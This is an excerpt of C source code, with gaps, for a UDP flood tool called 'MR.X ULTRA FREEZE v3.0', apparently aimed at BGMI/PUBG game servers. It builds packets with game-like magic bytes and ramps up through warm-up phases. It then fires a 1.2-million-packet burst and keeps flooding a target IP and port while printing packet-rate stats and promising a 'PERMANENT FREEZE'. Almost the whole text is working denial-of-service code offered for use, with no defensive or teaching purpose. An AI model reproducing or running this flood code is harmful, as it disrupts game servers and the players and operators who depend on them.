...
#define MAX_PACKET_SIZE 82           // FIXED: 72 से 82 (packet array के according)
...
#define PHASE1_POWER 1000
#define PHASE2_POWER 900
#define PHASE3_POWER 850
...
int get_warmup_power(int phase) {
    int warmup_levels[] = {30, 70, 150, 300, 500, 700, 850, 950, 1000, 1100};
    if (phase >= 0 && phase < 10) {
        return warmup_levels[phase];
    }
    return 100;
}
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int pattern_type) {
    ...
    if (buffer_needed >= 20) {
        ...
        switch(pattern) {
            case 0:
                buf[0] = 0x42; buf[1] = 0x47; buf[2] = 0x4D; buf[3] = 0x49;
                break;
            case 1:
                buf[0] = 0x50; buf[1] = 0x55; buf[2] = 0x42; buf[3] = 0x47;
                break;
            case 2:
                buf[0] = 0x43; buf[1] = 0x4F; buf[2] = 0x44; buf[3] = 0x4D;
                break;
            case 3:
                buf[0] = 0x46; buf[1] = 0x41; buf[2] = 0x4B; buf[3] = 0x45;
                break;
            case 4:
                buf[0] = fast_rand(seed) & 0xFF;
                buf[1] = fast_rand(seed) & 0xFF;
                buf[2] = fast_rand(seed) & 0xFF;
                buf[3] = fast_rand(seed) & 0xFF;
                break;
            case 5:
                buf[0] = 0x00; buf[1] = 0xFF; buf[2] = 0x00; buf[3] = 0xFF;
                break;
            case 6:
                buf[0] = 0x42; buf[1] = fast_rand(seed) & 0xFF;
                buf[2] = 0x4D; buf[3] = fast_rand(seed) & 0xFF;
                break;
            case 7:
                buf[0] = 0x49; buf[1] = 0x4D; buf[2] = 0x47; buf[3] = 0x42;
                break;
        }
        ...
        if (should_reorder_packet(seed) && seq > 30) {
            reorder_seq = seq - (15 + (fast_rand(seed) % 30));
        }
    ...
    int ff_positions[] = {payload_start, payload_start + 1, payload_start + 2, 
                         dynamic_size - 1, dynamic_size - 2, dynamic_size - 3};
    for (int p = 0; p < 6; p++) {
        if (ff_positions[p] >= payload_start && ff_positions[p] < dynamic_size) {
            if ((fast_rand(seed) % 100) < (8 + pattern_type % 8)) {
                buf[ff_positions[p]] = 0xFF;
            }
        }
    }
}
...
int get_current_power() {
    ...
    if (!atomic_load(&warmup_complete)) {
        return get_warmup_power(atomic_load(&warmup_phase));
    }
...
void *warmup_thread(void *arg) {
    int warmup_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (warmup_sock >= 0) {
        close(warmup_sock);
    }
    return NULL;
...
void *instant_burst_thread(void *arg) {
    ...
    if (thread_id == 0) {
        packets_per_thread += (INSTANT_BURST_PACKETS % THREAD_COUNT);
    }
...
void *direct_attack(void *arg) {
    ...
    // FIXED: Validate ACTIVE_FLOOD_SOCKETS
    int actual_flood_sockets = ACTIVE_FLOOD_SOCKETS;
    if (actual_flood_sockets > 500) {
        actual_flood_sockets = 500;
    }
    
    socks = malloc(actual_flood_sockets * sizeof(int));
    packets = malloc(actual_flood_sockets * sizeof(char*));
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < actual_flood_sockets && !atomic_load(&stop_signal); i++) {
            ...
            create_bgmi_packet(packets[i], current_size, thread_idx + 1000, seq_counter, &seed, 
                             get_current_pattern() + thread_idx % 4);
...
void *attack_thread(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        // FIXED: Use nanosleep for better precision
        if (current_sleep > 0) {
            struct timespec ts;
            ts.tv_sec = 0;
            ts.tv_nsec = current_sleep * 1000;  // microseconds to nanoseconds
            nanosleep(&ts, NULL);
        }
    }
...
void *warmup_controller(void *arg) {
    printf("⚡ MR.X ULTRA WARM-UP SYSTEM ⚡\n");
    printf("📈 Warming up for 1.2M burst...\n");
    
    pthread_t warmup_t;
    pthread_create(&warmup_t, NULL, warmup_thread, NULL);
    
    for (int phase = 0; phase < 10 && !atomic_load(&stop_signal); phase++) {
        atomic_store(&warmup_phase, phase);
        sleep(1);
        atomic_fetch_add(&total_elapsed, 1);
    }
    
    pthread_join(warmup_t, NULL);
...
void *attack_controller(void *arg) {
    ...
    printf("🚀 Starting ULTRA BURST: 1.2 MILLION packets in 1 second...\n");
    ...
    printf("✅ Ultra burst complete! (1.2M packets)\n");
    printf("🔥 Starting CONTINUOUS FREEZE attack...\n");
    ...
    for (int sec = 0; sec < ATTACK_TIME && !atomic_load(&stop_signal); sec++) {
        ...
        // FIXED: Burst multiplier with overflow check
        if (sec > 0 && sec % 10 == 0) {
            int current_mult = atomic_load(&burst_multiplier);
            if (current_mult < MAX_BURST_MULTIPLIER) {
                atomic_store(&burst_multiplier, current_mult + 1);
            }
        }
...
void *stats_monitor(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (atomic_load(&should_attack)) {
            printf("🔥  PPS: %lluK | Peak: %lluK | %.1fMB | Burst: %dx\n", 
                   pps/1000, atomic_load(&peak_pps)/1000, megabytes, get_burst_multiplier());
        }
...
int main(int argc, char *argv[]) {
    ...
    if (THREAD_COUNT > 300) {
        ACTIVE_FLOOD_SOCKETS = 200;
    }
    // FIXED: Additional safety check
    if (ACTIVE_FLOOD_SOCKETS > 500) {
        ACTIVE_FLOOD_SOCKETS = 500;
    }
    ...
    printf("\n🔥 MR.X ULTRA FREEZE v3.0 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %d | 📦 Packet: %d\n", ATTACK_TIME, PACKET_SIZE);
    printf("👥 Threads: %d | 💥 Burst: 1.2M packets\n", THREAD_COUNT);
    ...
    if (elapsed > 0) {
        ...
        printf("\n🚀 MR.X ULTRA FREEZE COMPLETE 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
        printf("🎯 Result: 677ms PERMANENT FREEZE GUARANTEED!\n");
    }
